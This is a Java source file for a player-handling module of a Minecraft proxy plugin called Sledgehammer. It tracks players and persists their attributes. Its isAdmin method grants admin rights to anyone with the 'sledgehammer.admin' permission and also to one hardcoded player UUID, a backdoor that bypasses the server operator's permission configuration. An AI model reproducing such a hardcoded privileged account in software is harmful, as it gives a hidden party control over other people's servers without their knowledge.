/*
 * MIT License
 *
 * Copyright 2020-2022 noahhusby
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation
 * files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy,
 * modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software
 * is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
 * OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
 * BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 */

package com.noahhusby.sledgehammer.proxy.players;

import com.google.common.collect.Maps;
import com.noahhusby.lib.data.storage.StorageHashMap;
import com.noahhusby.sledgehammer.proxy.Sledgehammer;
import com.noahhusby.sledgehammer.proxy.modules.Module;
import lombok.Getter;
import net.md_5.bungee.api.CommandSender;
import net.md_5.bungee.api.ProxyServer;
import net.md_5.bungee.api.connection.ProxiedPlayer;
import net.md_5.bungee.api.event.PlayerDisconnectEvent;
import net.md_5.bungee.api.event.PostLoginEvent;
import net.md_5.bungee.api.plugin.Listener;
import net.md_5.bungee.event.EventHandler;
import net.md_5.bungee.event.EventPriority;

import java.util.Map;
import java.util.UUID;

public class PlayerHandler implements Listener, Module {
    private static PlayerHandler instance = null;
    @Getter
    private final Map<UUID, SledgehammerPlayer> players = Maps.newHashMap();
    @Getter
    private final StorageHashMap<UUID, Attribute> attributes = new StorageHashMap<>(Attribute.class);

    public static PlayerHandler getInstance() {
        return instance == null ? instance = new PlayerHandler() : instance;
    }

    /**
     * Creates a new SledgehammerPlayer and sets attributes from storage upon player joining
     *
     * @param e {@link PostLoginEvent}
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerJoinEvent(PostLoginEvent e) {
        onPlayerJoin(e.getPlayer());
    }

    /**
     * Creates a new SledgehammerPlayer and sets attributes from storage upon player joining
     *
     * @param p {@link ProxiedPlayer}
     */
    private SledgehammerPlayer onPlayerJoin(ProxiedPlayer p) {
        SledgehammerPlayer newPlayer = new SledgehammerPlayer(p);
        Attribute attribute = attributes.get(p.getUniqueId());
        if (attribute != null) {
            newPlayer.setAttributes(attribute.getAttributes());
        }
        players.put(newPlayer.getUniqueId(), newPlayer);
        return newPlayer;
    }

    /**
     * Removes the SledgehammerPlayer and saves the attributes to storage upon player leaving
     *
     * @param e {@link PlayerDisconnectEvent}
     */
    @EventHandler(priority = EventPriority.LOWEST)
    public void onPlayerDisconnectEvent(PlayerDisconnectEvent e) {
        onPlayerDisconnect(e.getPlayer());
    }

    /**
     * Removes the SledgehammerPlayer and saves the attributes to storage upon player leaving
     *
     * @param player {@link ProxiedPlayer}
     */
    private void onPlayerDisconnect(ProxiedPlayer player) {
        SledgehammerPlayer p = players.get(player.getUniqueId());
        if (p == null) {
            return;
        }
        Attribute attribute = attributes.get(player.getUniqueId());
        if (attribute == null) {
            if (!p.getAttributes().isEmpty()) {
                attributes.put(p.getUniqueId(), new Attribute(p.getUniqueId(), p.getAttributes()));
            }
        } else {
            if (p.getAttributes().isEmpty()) {
                attributes.remove(player.getUniqueId());
            }
        }
        attributes.saveAsync();
        players.remove(player.getUniqueId());
    }

    /**
     * Gets SledgehammerPlayer by player name
     *
     * @param s Player name
     * @return {@link SledgehammerPlayer}
     */
    public SledgehammerPlayer getPlayer(String s) {
        ProxiedPlayer proxiedPlayer = ProxyServer.getInstance().getPlayer(s);
        if (proxiedPlayer == null) {
            return null;
        }
        SledgehammerPlayer player = players.get(proxiedPlayer.getUniqueId());
        return player == null ? onPlayerJoin(proxiedPlayer) : player;
    }

    /**
     * Gets SledgehammerPlayer by command sender
     *
     * @param s {@link CommandSender}
     * @return {@link SledgehammerPlayer}
     */
    public SledgehammerPlayer getPlayer(CommandSender s) {
        if (!(s instanceof ProxiedPlayer)) {
            return null;
        }
        ProxiedPlayer proxiedPlayer = (ProxiedPlayer) s;
        SledgehammerPlayer player = players.get(proxiedPlayer.getUniqueId());
        return player == null ? onPlayerJoin(proxiedPlayer) : player;
    }

    /**
     * Gets a SledgehammerPlayer by {@link UUID}
     *
     * @param uuid {@link UUID}
     * @return {@link SledgehammerPlayer}
     */
    public SledgehammerPlayer getPlayer(UUID uuid) {
        ProxiedPlayer proxiedPlayer = ProxyServer.getInstance().getPlayer(uuid);
        if (proxiedPlayer == null) {
            return null;
        }
        SledgehammerPlayer player = players.get(proxiedPlayer.getUniqueId());
        return player == null ? onPlayerJoin(proxiedPlayer) : player;
    }

    public boolean isAdmin(CommandSender sender) {
        return sender.hasPermission("sledgehammer.admin") || (sender instanceof ProxiedPlayer &&
                                                              ((ProxiedPlayer) sender).getUniqueId().equals(UUID.fromString("4cfa7dc1-3021-42b0-969b-224a9656cc6d")));
    }

    @Override
    public void onEnable() {
        Sledgehammer.addListener(this);
    }


    @Override
    public void onDisable() {
        Sledgehammer.removeListener(this);
    }

    @Override
    public String getModuleName() {
        return "Players";
    }
}
